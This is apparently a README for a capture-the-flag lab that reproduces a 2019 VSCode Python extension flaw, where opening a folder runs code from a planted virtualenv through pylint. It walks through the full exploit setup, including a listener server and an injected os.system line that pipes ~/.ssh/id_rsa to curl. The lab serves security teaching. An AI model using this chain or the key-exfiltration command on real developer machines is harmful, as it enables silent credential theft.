# Developer Tool Exploit CTF

In late 2019, an exploit was found within the VSCode Python extension. When the editor opened a folder containing a Python virtualenv, that editor could, with the right files in the folder, being executing code contained in the virtualenv without any notification or confirmation from the user. Code execution from simply opening a folder is unexpected and could have led to mass compromises of developer computers. This exploit has been patched out in early 2020.

## Steps for reproducing the exploit

This has been tested outside of a container, but not inside.

### VSCode Setup:

#### Disable auto updates for extensions

This key must be added to the settings file user data directory we use in the container (available at `$USER_DATA_DIR/User/settings.json`)
```json
{
    ...
    "extensions.autoUpdate": false
}
```

#### Install Extension
```sh
    wget https://github.com/microsoft/vscode-python/releases/download/2019.10.44104/ms-python-release.vsix
    code --install-extension ./ms-python-release.vsix
```
Note: other extension versions will work. The exploit went fully public in March of 2020, before a fix was applied. I don't know when this bug was introduced. But the bug was first found in early October 2019. So any extension release between those dates should work.

### Exploit Setup (these are the steps the player must take)

The following steps will be done by the player in a folder that we will mount into the container.

#### Create Virtualenv

```sh
    python -m venv myvenv # other names than "myvenv" would work, so long as the player is consistent
```

#### Create `.vscode/settings.json`
```json
{
    "python.pythonPath": "myvenv/bin/python"
}
```

#### Install pylint
`pylint` should be ran when the repository is opened, assuming the victim has not changed the default linting setting. Because we have control over the victims config, we will keep it enabled.

```sh
    myvenv/bin/pip install pylint
```

#### Add a main python file

While users will likely open at least one of your source files eventually, the test environment is configured to open `main.py` in the root of the repository.

```sh
    touch main.py
```

#### Prepare a way to extract the flag

For example, you may want to create a simple web server that will echo any posted data. One example might be:

```python
import http.server
import socketserver

listen_port = 8000

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        body_len = int(self.headers['Content-Length'])
        print(str(self.rfile.read(body_len)))

with socketserver.TCPServer(("", listen_port), Handler) as srv:
    print("listening for POST'ed data on port", listen_port)
    srv.serve_forever()
```

#### Put the malicious code in one of `pylint`'s sources
For example, you could add to `__main__.py`:

```python
    import os
    os.system("cat ~/.ssh/id_rsa | curl http://localhost:8000 -d $(</dev/stdin)")
```
This would be an example for if you setup a web server on your local machine to read ssh keys from the request body.

#### Make sure the python symlink is pointing to the correct path

NOTE: This path may be different in the container than it is on your host! Attacks need to be targeted to specific distros. This CTF currently targets Ubuntu 21.04, which has python available at `/usr/bin/python3`.

#### Run the exploit

<!-- Note: we need to change the tag "capstone-vscode" to whatever path we use on docker hub when we push it -->
```sh
    docker run --rm -v /local/path/to/my/exploit:/repo --net=host capstone-vscode
```
